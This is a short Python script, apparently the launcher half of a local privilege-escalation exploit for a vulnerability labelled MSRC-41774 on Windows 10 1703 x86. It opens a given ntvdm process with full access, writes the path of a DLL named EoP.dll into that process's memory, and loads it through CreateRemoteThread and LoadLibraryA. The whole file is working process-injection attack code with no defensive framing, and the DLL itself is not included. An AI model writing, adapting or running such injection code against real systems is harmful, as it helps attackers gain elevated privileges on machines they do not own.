from Kernel32 import *
from platform import release, version, architecture
from sys import argv, exit

def DllInject(ProcessId):
	process = OpenProcess(PROCESS_ALL_ACCESS, False, ProcessId)

	module = GetModuleHandleW("kernel32.dll")
	LoadLibraryA = GetProcAddress(module, b"LoadLibraryA")
	CloseHandle(module)

	dll = b".\\EoP.dll"
	address = VirtualAllocEx(process, None, len(dll), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)
	WriteProcessMemory(process, address, dll, len(dll), None)

	CreateRemoteThread(process, None, 0, LoadLibraryA, address, 0, None)

	CloseHandle(process)

if __name__ == "__main__":
	if release() != "10" or version() != "10.0.15063" or architecture()[0] != "32bit":
		exit("The MSRC-41774 vulnerability only exists on Windows 10 1703 x86")

	if len(argv) != 2:
		exit("{} [ntvdm process id]".format(argv[0]))

	DllInject(int(argv[1]))
